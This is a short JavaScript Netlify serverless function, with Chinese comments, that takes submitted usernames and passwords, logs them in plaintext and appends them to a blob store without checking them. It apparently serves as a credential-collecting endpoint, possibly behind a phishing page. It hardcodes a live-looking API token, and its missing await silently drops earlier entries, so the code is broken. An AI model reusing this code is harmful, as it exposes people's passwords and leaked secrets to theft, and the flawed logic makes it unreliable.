const {getStore} = require("@netlify/blobs");

const siteID = '11c8ee6b-b6e3-40e2-ac72-d318b943066f'; // 替换为实际的Site ID
const token = 'nfp_QiY2SXh1EsPKHR9wYRnRXFz6KDtheXYfcce2'; // 替换为实际的API Token


exports.handler = async (event) => {
  const { httpMethod, body } = event;

  if (httpMethod === 'POST') {
    try {
      // 解析JSON body，假定body格式为{ username: 'username', password: 'password' }
      const parsedBody = JSON.parse(body);
      console.log('Received POST request with body:', parsedBody);


      const storage=getStore({
          name:'deploy',
          siteID:siteID,
          token:token
      });


      let data = {
        username: parsedBody.username,
        password: parsedBody.password
      };
      data=JSON.stringify(data);
      let from=storage.get('userData');
      from=JSON.stringify(from);
      console.log(`data from the storage`,from,'type of:',typeof from);
      data=from+"\n"+data;

      await storage.set('userData', data);
      console.log(`File uploaded successfully. Blob data: ${data}`);

      return {
        statusCode: 200,
        body: JSON.stringify({ message: 'User data recorded successfully' })
      };
    } catch (error) {
      console.error('Error processing the request:', error);
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Error processing the request' })
      };
    }
  } else {
    return {
      statusCode: 405, // Method Not Allowed
      body: JSON.stringify({ error: 'Only POST method is allowed for user login' })
    };
  }
};
